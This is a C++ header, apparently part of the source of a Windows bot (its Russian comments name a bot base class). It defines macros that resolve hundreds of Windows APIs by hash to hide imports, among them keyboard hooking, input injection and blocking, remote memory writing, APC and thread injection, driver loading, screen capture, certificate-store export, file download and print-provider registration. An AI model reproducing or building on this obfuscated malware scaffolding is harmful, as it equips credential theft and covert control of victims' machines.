#define pGetKeyboardLayout			pushargEx< DLL_USER32, 0xA0C69BF7, 327 >
#define pToUnicodeEx    			pushargEx< DLL_USER32, 0x2944D0D1, 328 >
#define pLoadCursorW    			pushargEx< DLL_USER32, 0xCFB2E5CF, 329 >
#define pLoadCursorA    			pushargEx< DLL_USER32, 0xCFB2E5D9, 330 >
#define pRegisterClassA    			pushargEx< DLL_USER32, 0xAEABC9A4, 331 >
#define pCreateWindowExA   			pushargEx< DLL_USER32, 0xBF7EFB5A, 332 >
#define pTranslateMessage   		pushargEx< DLL_USER32, 0xC45D9631, 333 >
#define pDispatchMessageA   		pushargEx< DLL_USER32, 0x4BAED1C8, 334 >
#define pGetWindowDC   				pushargEx< DLL_USER32, 0xB95254C7, 335 >
#define pReleaseDC					pushargEx< DLL_USER32, 0x4CB2D16D, 336 >
#define pFillRect					pushargEx< DLL_USER32, 0xCAD4D692, 337 >
#define pCallWindowProcW			pushargEx< DLL_USER32, 0xEE5FDA91, 338 >
#define pSetTimer       			pushargEx< DLL_USER32, 0x4D9CE557, 339 >
#define pDestroyWindow      		pushargEx< DLL_USER32, 0xEB4A6DB3, 340 >
#define pGetFocus           		pushargEx< DLL_USER32, 0x6D776D57, 341 >
#define pCharLowerBuffA        		pushargEx< DLL_USER32, 0x5FDA1871, 342 >
#define pCharLowerBuffW        		pushargEx< DLL_USER32, 0x5FDA1867, 343 >
#define pCharUpperBuffA        		pushargEx< DLL_USER32, 0xC0D4187D, 344 >
#define pCharUpperBuffW        		pushargEx< DLL_USER32, 0xC0D4186B, 345 >
#define pwvsprintfA 				pushargEx< DLL_USER32, 0x6B3AF0EC, 346 >
#define pwvsprintfW 				pushargEx< DLL_USER32, 0x6B3AF0FA, 347 >
#define pSetWindowsHookExA 			pushargEx< DLL_USER32, 0xB4584DDA, 348 >
#define pSetWindowsHookExW 			pushargEx< DLL_USER32, 0xB4584DCC, 349 >
#define pUnhookWindowsHookEx 		pushargEx< DLL_USER32, 0xB800C8A6, 350 >
#define pSetWindowTextA 			pushargEx< DLL_USER32, 0x3C29100A, 351 >
#define pSetWindowTextW 			pushargEx< DLL_USER32, 0x3C29101C, 352 >
#define pSetWindowLongPtrA			pushargEx< DLL_USER32, 0x334A94D2, 353 >
#define pSetWindowLongPtrW			pushargEx< DLL_USER32, 0x334A94C4, 354 >
#define pScreenToClient				pushargEx< DLL_USER32, 0xBDAE901A, 355 >
#define pGetClientRect				pushargEx< DLL_USER32, 0xA2F65BA2, 356 >
#define pGetDlgItem					pushargEx< DLL_USER32, 0x9CD421A8, 357 >
#define pCallNextHookEx				pushargEx< DLL_USER32, 0x8616AB9B, 358 >
#define pGetCursor					pushargEx< DLL_USER32, 0x199725ED, 359 >
#define pSetCursor					pushargEx< DLL_USER32, 0xD9725ED, 360 >
#define pGetAncestor			 	pushargEx< DLL_USER32, 0xAAFE9D1E, 361 >
#define pRegisterWindowMessageA	 	pushargEx< DLL_USER32, 0xE5D2B59, 362 >
#define pGetDC			        	pushargEx< DLL_USER32, 0x7CBD2247, 363 >
#define pGetClassLongA	        	pushargEx< DLL_USER32, 0x2544C17C, 364 >
#define pPrintWindow	        	pushargEx< DLL_USER32, 0xF404F170, 365 >
#define pGetWindowPlacement	       	pushargEx< DLL_USER32, 0xE06982CE, 366 >
#define pIsIconic			       	pushargEx< DLL_USER32, 0x3D687AAD, 367 >
#define pSetFocus			       	pushargEx< DLL_USER32, 0x6D5F6D57, 368 >
#define pSetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98FC, 369 >
#define pSetCursorPos				pushargEx< DLL_USER32, 0xBDB58517, 370 >
#define pAttachThreadInput			pushargEx< DLL_USER32, 0xE16B4137, 371 >
#define pUpdateWindow				pushargEx< DLL_USER32, 0xFC3A1D7B, 372 >
#define pDestroyMenu				pushargEx< DLL_USER32, 0x6A50AD38, 373 >
#define pmouse_event				pushargEx< DLL_USER32, 0xAB3EFAFD, 374 >
#define pSetCapture					pushargEx< DLL_USER32, 0xEB747643, 375 >
#define pReleaseCapture				pushargEx< DLL_USER32, 0x6B0BEF18, 376 >
#define pBlockInput					pushargEx< DLL_USER32, 0xF103B589, 377 >
#define pSendInput					pushargEx< DLL_USER32, 0xce1781d0, 378 >
#define pEnumThreadWindows          pushargEx< DLL_USER32, 0x605A65D8, 379 >
#define pIsWindowEnabled			pushargEx< DLL_USER32, 0xEEC91F07, 380 >
#define pSendNotifyMessageA			pushargEx< DLL_USER32, 0x1AB922BF, 381 >

//winsock
#define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD, 382 >
#define pWSAStartup 				pushargEx< DLL_WINSOCK, 0xCDDE757D, 383 >
#define psocket 					pushargEx< DLL_WINSOCK, 0xFC7AF16A, 384 >
#define pclosesocket 				pushargEx< DLL_WINSOCK, 0x939D7D9C, 385 >
#define paccept 					pushargEx< DLL_WINSOCK, 0x3C797B7A, 386 >
#define pbind 						pushargEx< DLL_WINSOCK, 0xC5A7764, 387 >
#define phtons 						pushargEx< DLL_WINSOCK, 0x8E9BF775, 388 >
#define plisten 					pushargEx< DLL_WINSOCK, 0x9E7D3188, 389 >
#define precv 						pushargEx< DLL_WINSOCK, 0xE5971F6, 390 >
#define psend 						pushargEx< DLL_WINSOCK, 0xE797764, 391 >
#define pconnect 					pushargEx< DLL_WINSOCK, 0xEDD8FE8A, 392 >
#define pshutdown 					pushargEx< DLL_WINSOCK, 0x4C7C5841, 393 >
#define pgethostbyname 				pushargEx< DLL_WINSOCK, 0xF44318C6, 394 >
#define pgethostbyaddr 				pushargEx< DLL_WINSOCK, 0xF5A25C51, 395 >
#define pinet_addr 					pushargEx< DLL_WINSOCK, 0x95E4A5D7, 396 >
#define pinet_ntoa 					pushargEx< DLL_WINSOCK, 0x9400A044, 397 >
#define pgetaddrinfo				pushargEx< DLL_WINSOCK, 0xD9F839BA, 398 >
#define pgetpeername				pushargEx< DLL_WINSOCK, 0xD939F838, 399 >
#define pselect						pushargEx< DLL_WINSOCK, 0x5D99726A, 400 >
#define psetsockopt					pushargEx< DLL_WINSOCK, 0xD8923733, 401 >
#define pWSAGetLastError			pushargEx< DLL_WINSOCK, 0x8E878072, 402 >
#define pWSASetLastError			pushargEx< DLL_WINSOCK, 0x8E850072, 403 >
#define pioctlsocket		     	pushargEx< DLL_WINSOCK, 0x1F935B1D, 404 >
#define pWSAFDIsSet   		     	pushargEx< DLL_WINSOCK, 0x4DFC1F3B, 405 >

//ntdll
#define pRtlInitUnicodeString 		pushargEx< DLL_NTDLL, 0x3287EC73, 406 >
#define pRtlInitAnsiString			pushargEx< DLL_NTDLL, 0xEE02056A, 407 >
#define pNtOpenFile 				pushargEx< DLL_NTDLL, 0x9C45B56C, 408 >
#define pNtOpenDirectoryObject 		pushargEx< DLL_NTDLL, 0xF5F11CF0, 409 >
#define pNtCreateSection 			pushargEx< DLL_NTDLL, 0x6E6F608B, 410 >
#define pNtOpenSection 				pushargEx< DLL_NTDLL, 0x5FA9AB38, 411 >
#define pZwLoadDriver 				pushargEx< DLL_NTDLL, 0x42F57D33, 412 >
#define pZwUnloadDriver 			pushargEx< DLL_NTDLL, 0x95849B61, 413 >
#define pRtlAdjustPrivilege 		pushargEx< DLL_NTDLL, 0xC2A6B1AE, 414 >
#define pZwMakeTemporaryObject 		pushargEx< DLL_NTDLL, 0x128CE9D3, 415 >
#define pNtClose 					pushargEx< DLL_NTDLL, 0x3D9AC241, 416 >
#define pRtlImageNtHeader			pushargEx< DLL_NTDLL, 0xDD39FD14, 417 >
#define pZwQuerySystemInformation	pushargEx< DLL_NTDLL, 0xBC44A131, 418 >
#define pZwUnmapViewOfSection		pushargEx< DLL_NTDLL, 0x9ED4D161, 419 >
#define pZwMapViewOfSection			pushargEx< DLL_NTDLL, 0x594D9A3C, 420 >
#define pZwQueueApcThread			pushargEx< DLL_NTDLL, 0xC0E4F6EE, 421 >
#define pZwResumeThread				pushargEx< DLL_NTDLL, 0xACF8BF39, 422 >
#define pZwTestAlert				pushargEx< DLL_NTDLL, 0xC952A06B, 423 >
#define pZwQueryInformationThread	pushargEx< DLL_NTDLL, 0xFAEDF3AA, 424 >
#define pZwOpenProcess				pushargEx< DLL_NTDLL, 0x9C0AC99D, 425 >
#define pZwOpenProcessToken			pushargEx< DLL_NTDLL, 0xADACBE07, 426 >
#define pZwClose					pushargEx< DLL_NTDLL, 0x3D9A9259, 427 >
#define pZwAllocateVirtualMemory	pushargEx< DLL_NTDLL, 0x594AA9E4, 428 >
#define pZwFreeVirtualMemory		pushargEx< DLL_NTDLL, 0xBED3922C, 429 >
#define pZwWriteVirtualMemory		pushargEx< DLL_NTDLL, 0xEEE7AF23, 430 >
#define pZwProtectVirtualMemory		pushargEx< DLL_NTDLL, 0x3836C63E, 431 >
#define pRtlCreateUserThread		pushargEx< DLL_NTDLL, 0xE9E0A4F7, 432 >
#define pLdrLoadDll					pushargEx< DLL_NTDLL, 0x78740534, 433 >
#define pLdrGetDllHandle			pushargEx< DLL_NTDLL, 0x7E287C6A, 434 >
#define pLdrGetProcedureAddress		pushargEx< DLL_NTDLL, 0x323C2875, 435 >
#define pZwSetContextThread			pushargEx< DLL_NTDLL, 0x62E2FE6F, 436 >
#define pZwSetInformationProcess	pushargEx< DLL_NTDLL, 0xCA2BF652, 437 >
#define pZwQueryInformationProcess	pushargEx< DLL_NTDLL, 0xA638CE5F, 438 >
#define pRtlImageDirectoryEntryToData pushargEx< DLL_NTDLL, 0x503f7b28, 439 >
#define pZwQueryInformationFile		pushargEx< DLL_NTDLL, 0x0f7ba4b7, 440 >
#define pZwShutdownSystem			pushargEx< DLL_NTDLL, 0x6F1C809E, 441 >
#define pRtlComputeCrc32			pushargEx< DLL_NTDLL,0x687B7023, 442 >
#define pNtQuerySystemInformation	pushargEx< DLL_NTDLL,0xB044A119, 443 >
#define pNtDeviceIoControlFile		pushargEx< DLL_NTDLL,0x385C70F2, 444 >
#define pNtMapViewOfSection			pushargEx< DLL_NTDLL,0x534E9A3C, 445 >
#define pNtUnmapViewOfSection		pushargEx< DLL_NTDLL,0x5ED4D3E1, 446 >


//winsta
#define pWinStationTerminateProcess	pushargEx< DLL_WINSTA, 0xA60C5F05, 447 >

//shell32
#define pSHGetSpecialFolderPathA 	pushargEx< DLL_SHELL32, 0xC95D8550, 448 >
#define pSHGetSpecialFolderPathW 	pushargEx< DLL_SHELL32, 0xC95D8546, 449 >
#define pFindExecutableA			pushargEx< DLL_SHELL32, 0x37707500, 450 >
#define pFindExecutableW			pushargEx< DLL_SHELL32, 0x37707516, 451 >
#define pSHGetFolderPathA			pushargEx< DLL_SHELL32, 0xDEAA9541, 452 >
#define pSHGetFolderPathW			pushargEx< DLL_SHELL32, 0xDEAA9557, 453 >
#define pShellExecuteW				pushargEx< DLL_SHELL32, 0x570BC88F, 454 >
#define pShellExecuteA				pushargEx< DLL_SHELL32, 0x570BC899, 455 >
#define pStrStrIW 					pushargEx< DLL_SHELL32, 0x3E3B7742, 456 > //	PTSTR StrStrI(PTSTR pszFirst,PCTSTR pszSrch);
#define pStrStrIA 					pushargEx< DLL_SHELL32, 0x3E3B7754, 457 >
#define pShellExecuteExA			pushargEx< DLL_SHELL32, 0xf2276983, 458 >
#define pShellExecuteExW			pushargEx< DLL_SHELL32, 0xf2276995, 459 >
#define pSHFileOperationA			pushargEx< DLL_SHELL32, 0x8B6D020B, 460 >
#define pSHFileOperationW			pushargEx< DLL_SHELL32, 0x8B6D021D, 461 >
#define pSHCreateDirectoryExA		pushargEx< DLL_SHELL32, 0xCD5CF4B2, 0 >
#define pSHCreateDirectoryExW		pushargEx< DLL_SHELL32, 0xCD5CF4A4, 0 >

//wininet
#define pInternetConnectA 			pushargEx< DLL_WININET, 0xBE618D3E, 462 >
#define pInternetConnectW 			pushargEx< DLL_WININET, 0xBE618D28, 463 >
#define pHttpOpenRequestA 			pushargEx< DLL_WININET, 0x1510002F, 464 >
#define pHttpOpenRequestW 			pushargEx< DLL_WININET, 0x15100039, 465 >
#define pHttpSendRequestA 			pushargEx< DLL_WININET, 0x9F13856A, 466 >
#define pHttpSendRequestW 			pushargEx< DLL_WININET, 0x9F13857C, 467 >
#define pInternetCloseHandle 		pushargEx< DLL_WININET, 0x7314FB0C, 468 >
#define pInternetQueryOptionA 		pushargEx< DLL_WININET, 0x2AE71934, 469 >
#define pInternetQueryOptionW 		pushargEx< DLL_WININET, 0x2AE71922, 470 >
#define pInternetSetOptionA 		pushargEx< DLL_WININET, 0x1AD09C78, 471 >
#define pInternetSetStatusCallback 	pushargEx< DLL_WININET, 0x9EF6461, 472 >
#define pHttpQueryInfoA 			pushargEx< DLL_WININET, 0x2F5CE027, 473 >
#define pHttpQueryInfoW 			pushargEx< DLL_WININET, 0x2F5CE031, 474 >
#define pHttpAddRequestHeadersA		pushargEx< DLL_WININET, 0xB5901061, 475 >
#define pHttpAddRequestHeadersW		pushargEx< DLL_WININET, 0xB5901077, 476 >
#define pGetUrlCacheEntryInfoW 		pushargEx< DLL_WININET, 0x57FBC0CB, 477 >
#define pGetUrlCacheEntryInfoA 		pushargEx< DLL_WININET, 0x57FBC0DD, 478 >
#define pFindFirstUrlCacheEntryA	pushargEx< DLL_WININET, 0xDDCB15D, 479 >
#define pFindNextUrlCacheEntryA		pushargEx< DLL_WININET, 0x8733D614, 480 >
#define pDeleteUrlCacheEntry		pushargEx< DLL_WININET, 0xA3A80AB6, 481 >
#define pFindCloseUrlCache			pushargEx< DLL_WININET, 0xFDE87743, 482 >
#define pInternetOpenA				pushargEx< DLL_WININET, 0x8593DD7, 483 >
#define pInternetOpenUrlA			pushargEx< DLL_WININET, 0xB87DBD66, 484 >
#define pInternetReadFile			pushargEx< DLL_WININET, 0x1A212962, 485 >
#define pInternetReadFileExA		pushargEx< DLL_WININET, 0x2C523864, 486 >
#define pInternetReadFileExW		pushargEx< DLL_WININET, 0x2C523872, 487 >
#define pReadUrlCacheEntryStream	pushargEx< DLL_WININET, 0x1672BC16, 488 >
#define pUnlockUrlCacheEntryStream	pushargEx< DLL_WININET, 0xEE22C82A, 489 >
#define pRetrieveUrlCacheEntryStreamA	pushargEx< DLL_WININET, 0x609C6936, 490 >
#define pFindFirstUrlCacheEntryExA  pushargEx< DLL_WININET, 0x2C567F36, 491 >
#define pFindNextUrlCacheEntryExA	pushargEx< DLL_WININET, 0xF5841D8D, 492 >
#define pDeleteUrlCacheEntryA		pushargEx< DLL_WININET, 0xD4055B10, 493 >
#define pCreateUrlCacheEntryA		pushargEx< DLL_WININET, 0x10815BF5, 494 >
#define pCommitUrlCacheEntryA		pushargEx< DLL_WININET, 0x548D61B6, 495 >


//urlmon
#define pURLDownloadToFileA			pushargEx< DLL_URLMON, 0xD95D2399, 496 >
#define pURLDownloadToFileW			pushargEx< DLL_URLMON, 0xD95D238F, 497 >
#define pObtainUserAgentString		pushargEx< DLL_URLMON, 0x534D481, 498 >


/* gdi32.dll */
#define pCreateCompatibleBitmap		  pushargEx< DLL_GDI, 0x6B3470D5, 499 >
#define pCreateCompatibleDC		      pushargEx< DLL_GDI, 0x5AF0017C, 500 >
#define pSelectObject       	      pushargEx< DLL_GDI, 0x4894DAFC, 501 >
#define pBitBlt             	      pushargEx< DLL_GDI, 0x9E90B462, 502 >
#define pDeleteDC            	      pushargEx< DLL_GDI, 0x5E10F525, 503 >
#define pDeleteObject           	  pushargEx< DLL_GDI, 0x48B87EFC, 504 >
#define pGetDeviceCaps           	  pushargEx< DLL_GDI, 0x39E9624F, 505 >
#define pCreateSolidBrush             pushargEx< DLL_GDI, 0xEF9AC06E, 506 >


/* gdiplus.dll */
#define pGdiplusStartup		          pushargEx< DLL_GDIPLUS, 0x55F74962, 507 >
#define pGdipCreateBitmapFromHBITMAP  pushargEx< DLL_GDIPLUS, 0xB7F0B572, 508 >
#define pGdipSaveImageToFile		  pushargEx< DLL_GDIPLUS, 0xE410B3EB, 509 >
#define pGdipDisposeImage	          pushargEx< DLL_GDIPLUS, 0x226FA923, 510 >
#define pGdiplusShutdown		      pushargEx< DLL_GDIPLUS, 0x99A24264, 511 >


//crypt32
#define pCertOpenSystemStoreA				pushargEx< DLL_CRYPT32, 0xEEA9ED9D, 512 >
#define pCertEnumCertificatesInStore		pushargEx< DLL_CRYPT32, 0x9897E094, 513 >
#define pPFXExportCertStoreEx				pushargEx< DLL_CRYPT32, 0xDFDB467E, 514 >
#define pCertCloseStore						pushargEx< DLL_CRYPT32, 0xCC1A6B6B, 515 >
#define pPFXImportCertStore					pushargEx< DLL_CRYPT32, 0x3A1B7F5D, 516 >
#define pCertAddCertificateContextToStore	pushargEx< DLL_CRYPT32, 0xDC6DD6E5, 517 >
#define pCertDuplicateCertificateContext	pushargEx< DLL_CRYPT32, 0x2F16F47, 518 >
#define pCertDeleteCertificateFromStore		pushargEx< DLL_CRYPT32, 0x5B08B5F, 519 >

// cryptdll.dll
#define pMD5Init	                        pushargEx< DLL_CRYPTDLL, 0x593A82D7, 520 >
#define pMD5Update	                        pushargEx< DLL_CRYPTDLL, 0x4110ACCA, 521 >
#define pMD5Final	                        pushargEx< DLL_CRYPTDLL, 0x6DA0A140, 522 >



//
//psapi.dll
#define	pGetMappedFileNameA			pushargEx< DLL_PSAPI, 0x860331a8, 523 >
#define pEnumProcessModules			pushargEx< DLL_PSAPI, 0x189F16C9, 524 >
#define pGetModuleBaseNameA			pushargEx< DLL_PSAPI, 0x7353EFE8, 525 >
#define pGetModuleFileNameExA		pushargEx< DLL_PSAPI, 0xE4FB2191, 526 >
#define pGetProcessImageFileNameA	pushargEx<DLL_PSAPI, 0x2741105, 527 >


//
//shlwapi.dll
#define	pPathFindFileNameA			pushargEx< DLL_SHLWAPI, 0xeed5398c, 528 >
#define pPathFindFileNameW			pushargEx< DLL_SHLWAPI, 0xEED5399A, 529 >
#define pPathCombineA				pushargEx< DLL_SHLWAPI, 0x45B615D5, 530 >
#define pPathCombineW				pushargEx< DLL_SHLWAPI, 0x45b615c3, 531 >
#define pStrStrA					pushargEx< DLL_SHLWAPI, 0x2A7C76E6, 532 >
#define pPathRemoveFileSpecA		pushargEx< DLL_SHLWAPI, 0xE6E3EE01, 533 >
#define pStrToIntA					pushargEx< DLL_SHLWAPI, 0xAAD270E7, 534 >
#define pStrToInt64ExA				pushargEx< DLL_SHLWAPI, 0xC3C5B48, 535 >
#define pPathAppendA				pushargEx< DLL_SHLWAPI, 0xF86AA1F6, 536 >
#define pPathAppendW				pushargEx< DLL_SHLWAPI, 0xF86AA1E0, 537 >
#define pPathIsDirectoryEmptyA		pushargEx< DLL_SHLWAPI, 0xCA98893B, 538 >
#define pPathStripPathA				pushargEx< DLL_SHLWAPI, 0x7EC609EF, 539 >
#define	pPathFindExtensionA			pushargEx< DLL_SHLWAPI, 0xDB2E50B6, 540 >
#define pPathFindExtensionW			pushargEx< DLL_SHLWAPI, 0xDB2E50A0, 541 >

//Iphlpapi.dll
#define	pGetIpNetTable				pushargEx< DLL_IPHLPAPI, 0xB8D99CE4, 542 >
#define	pGetAdaptersInfo			pushargEx< DLL_IPHLPAPI, 0xE69A1CD7, 543 >



//odbc32
#define pSQLAllocHandle				pushargEx< DLL_ODBC32, 0xEC1F2857, 544 >
#define pSQLSetEnvAttr				pushargEx< DLL_ODBC32, 0x88EE1E2C, 545 >
#define pSQLConnectA				pushargEx< DLL_ODBC32, 0x203F51DF, 546 >
#define pSQLDriverConnectA			pushargEx< DLL_ODBC32, 0x3941DBB7, 547 >
#define pSQLPrepareA				pushargEx< DLL_ODBC32, 0xC09D6D06, 548 >
#define pSQLBindCol					pushargEx< DLL_ODBC32, 0x3D09FC8B, 549 >
#define pSQLExecute					pushargEx< DLL_ODBC32, 0x8DE46D8A, 550 >
#define pSQLFetch					pushargEx< DLL_ODBC32, 0x6C1A778C, 551 >
#define pSQLCloseCursor				pushargEx< DLL_ODBC32, 0xACA2F119, 552 >
#define pSQLFreeHandle				pushargEx< DLL_ODBC32, 0x6A289300, 553 >
#define pSQLDisconnect				pushargEx< DLL_ODBC32, 0x8104CDA8, 554 >
#define pSQLBindParameter			pushargEx< DLL_ODBC32, 0xE8536508, 555 >
#define pSQLGetDiagRecA				pushargEx< DLL_ODBC32, 0x13C9473F, 556 >

//version.dll
#define pGetFileVersionInfoSizeA	pushargEx< DLL_VERSION, 0x8A94F707, 557 >
#define pGetFileVersionInfoA		pushargEx< DLL_VERSION, 0x7AA45C7A, 558 >
#define pVerQueryValueA				pushargEx< DLL_VERSION, 0x4E26C00F, 559 >

// ole32.dll
#define pCoCreateGuid				pushargEx< DLL_OLE32, 0xAA3E88A3, 560 >
#define pCoInitialize				pushargEx<DLL_OLE32, 0xF341D5CF, 561 >
#define pCoInitializeEx				pushargEx<DLL_OLE32, 0x7573DE28, 562 >
#define pCoUninitialize				pushargEx<DLL_OLE32, 0xEDB3159D, 563 >
#define pCoCreateInstance			pushargEx<DLL_OLE32, 0x368435BE, 564 >
#define pCoInitializeSecurity		pushargEx<DLL_OLE32, 0x910EACB3, 565 >

//winspool.drv
#define pAddPrintProvidorA			pushargEx<DLL_WINSPOOL, 0x4B12B4DF, 566 >
#define pDeletePrintProvidorA		pushargEx<DLL_WINSPOOL, 0x3D369C42, 567 >

//imagehlp
#define pCheckSumMappedFile			pushargEx<DLL_IMAGEHLP, 0xd5edc5a2, 568 >

#endif

//****************************************************************
//  Вспомогательные функции
//****************************************************************

#define Min(a,b) (((a) < (b)) ? (a) : (b))
#define Max(a,b) (((a) > (b)) ? (a) : (b))




DWORD inline pGetLastError() { return (DWORD)_pGetLastError(); }

//--------------------------------------------------
//  GetDLLName -  Функция возвращает имя библиотеки
//--------------------------------------------------
PCHAR GetDLLName(TDllId ID);

//****************************************************************
//  TBotClass - базовый класс бота
//****************************************************************


class TBotObject
{
public:
	virtual ~TBotObject() {}

	void* operator new(size_t size);
	void* operator new[](size_t size);
	void  operator delete(void* Pointer);
	void  operator delete[](void* Pointer);
};


//----------------------------------------------------------------------------
#endif
